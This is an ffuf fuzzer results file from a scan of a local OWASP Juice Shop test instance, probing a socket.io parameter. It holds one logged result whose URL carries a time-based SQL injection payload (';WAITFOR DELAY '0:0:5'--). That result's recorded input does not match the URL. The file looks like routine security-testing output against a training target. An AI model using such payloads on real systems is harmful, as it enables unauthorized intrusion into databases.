{"commandline":"ffuf -w /Users/raphaelpang/code/elise/payloads/temp/3fdd3548-f3a9-4e3f-bb20-07ffb4180993.txt -t 25 -mc 200,302,400,401,403,404,500 -timeout 30 -ac -json -o /Users/raphaelpang/code/elise/data/results/ffuf/ffuf_1755713866097.json -u http://localhost:8082/login/socket.io/?EIO=4\u0026transport=polling\u0026t=PZ8hCnb\u0026EIO=FUZZ -H referer: http://localhost:8082/login?return_to=https%3A%2F%2Fgithub.com%2Fjuice-shop%2Fjuice-shop -H user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/138.0.7204.23 Safari/537.36 -H accept: */*","time":"2025-08-21T02:17:46+08:00","results":[{"input":{"FFUFHASH":"57d6e1","FUZZ":".htaccessAePOHFTW"},"position":1,"status":400,"length":0,"words":1,"lines":1,"content-type":"","redirectlocation":"","scraper":{},"duration":730125,"resultfile":"","url":"http://localhost:8082/login/socket.io/?EIO=4\u0026transport=polling\u0026t=PZ8hCnb\u0026EIO=';WAITFOR DELAY '0:0:5'--","host":"localhost:8082"}],"config":{"autocalibration":true,"autocalibration_keyword":"FUZZ","autocalibration_perhost":false,"autocalibration_strategies":["basic"],"autocalibration_strings":[],"colors":false,"cmdline":"ffuf -w /Users/raphaelpang/code/elise/payloads/temp/3fdd3548-f3a9-4e3f-bb20-07ffb4180993.txt -t 25 -mc 200,302,400,401,403,404,500 -timeout 30 -ac -json -o /Users/raphaelpang/code/elise/data/results/ffuf/ffuf_1755713866097.json -u http://localhost:8082/login/socket.io/?EIO=4\u0026transport=polling\u0026t=PZ8hCnb\u0026EIO=FUZZ -H referer: http://localhost:8082/login?return_to=https%3A%2F%2Fgithub.com%2Fjuice-shop%2Fjuice-shop -H user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/138.0.7204.23 Safari/537.36 -H accept: */*","configfile":"","postdata":"","debuglog":"","delay":{"value":"0.00"},"dirsearch_compatibility":false,"encoders":[],"extensions":[],"fmode":"or","follow_redirects":false,"headers":{"Accept":"*/*","Referer":"http://localhost:8082/login?return_to=https%3A%2F%2Fgithub.com%2Fjuice-shop%2Fjuice-shop","User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/138.0.7204.23 Safari/537.36"},"ignorebody":false,"ignore_wordlist_comments":false,"inputmode":"clusterbomb","cmd_inputnum":100,"inputproviders":[{"name":"wordlist","keyword":"FUZZ","value":"/Users/raphaelpang/code/elise/payloads/temp/3fdd3548-f3a9-4e3f-bb20-07ffb4180993.txt","encoders":"","template":""}],"inputshell":"","json":true,"matchers":{"IsCalibrated":true,"Mutex":{},"Matchers":{"status":{"value":"200,302,400,401,403,404,500"}},"Filters":{"size":{"value":"80117"}},"PerDomainFilters":{}},"mmode":"or","maxtime":0,"maxtime_job":0,"method":"GET","noninteractive":false,"outputdirectory":"","outputfile":"/Users/raphaelpang/code/elise/data/results/ffuf/ffuf_1755713866097.json","outputformat":"json","OutputSkipEmptyFile":false,"proxyurl":"","quiet":false,"rate":0,"raw":false,"recursion":false,"recursion_depth":0,"recursion_strategy":"default","replayproxyurl":"","requestfile":"","requestproto":"https","scraperfile":"","scrapers":"all","sni":"","stop_403":false,"stop_all":false,"stop_errors":false,"threads":25,"timeout":30,"url":"http://localhost:8082/login/socket.io/?EIO=4\u0026transport=polling\u0026t=PZ8hCnb\u0026EIO=FUZZ","verbose":false,"wordlists":["/Users/raphaelpang/code/elise/payloads/temp/3fdd3548-f3a9-4e3f-bb20-07ffb4180993.txt"],"http2":false,"client-cert":"","client-key":""}}